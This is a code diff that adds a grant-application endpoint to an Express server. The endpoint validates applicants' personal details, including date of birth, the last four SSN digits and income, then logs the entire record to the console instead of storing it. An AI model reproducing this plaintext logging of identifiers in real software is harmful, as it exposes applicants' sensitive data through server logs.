@@ -30,6 +30,63 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  // Grant application submission endpoint
+  app.post("/api/grant-application", async (req, res) => {
+    try {
+      const grantApplicationSchema = z.object({
+        firstName: z.string().min(1, "First name is required"),
+        lastName: z.string().min(1, "Last name is required"),
+        email: z.string().email("Valid email is required"),
+        phone: z.string().min(1, "Phone number is required"),
+        address: z.string().min(1, "Address is required"),
+        city: z.string().min(1, "City is required"),
+        state: z.string().min(1, "State is required"),
+        zipCode: z.string().min(1, "ZIP code is required"),
+        dateOfBirth: z.string().min(1, "Date of birth is required"),
+        ssn: z.string().length(4, "Last 4 digits of SSN required"),
+        householdSize: z.string().min(1, "Household size is required"),
+        monthlyIncome: z.string().min(1, "Monthly income is required"),
+        employmentStatus: z.string().min(1, "Employment status is required"),
+        grantType: z.string().min(1, "Grant type is required"),
+        requestedAmount: z.string().min(1, "Requested amount is required"),
+        purpose: z.string().min(10, "Purpose must be at least 10 characters"),
+        hasDebts: z.boolean(),
+        agreeToTerms: z.boolean(),
+        agreeToVerification: z.boolean()
+      });
+
+      const validatedData = grantApplicationSchema.parse(req.body);
+      
+      // Generate application ID
+      const applicationId = `APP-${new Date().getFullYear()}-${Math.floor(Math.random() * 10000).toString().padStart(4, '0')}`;
+      
+      // Format data for storage/processing
+      const applicationData = {
+        ...validatedData,
+        applicationId,
+        submittedAt: new Date().toISOString(),
+        status: 'submitted'
+      };
+
+      // Here you would typically save to database
+      console.log('Grant application received:', applicationData);
+
+      res.status(201).json({ 
+        message: "Grant application submitted successfully",
+        applicationId: applicationId,
+        submittedAt: applicationData.submittedAt
+      });
+
+    } catch (error) {
+      console.error("Error in grant application:", error);
+      if (error instanceof z.ZodError) {
+        res.status(400).json({ message: "Invalid form data", errors: error.errors });
+      } else {
+        res.status(500).json({ message: "Failed to submit application. Please try again." });
+      }
+    }
+  });
+
   // Telegram report submission endpoint
   app.post("/api/telegram-report", async (req, res) => {
     try {
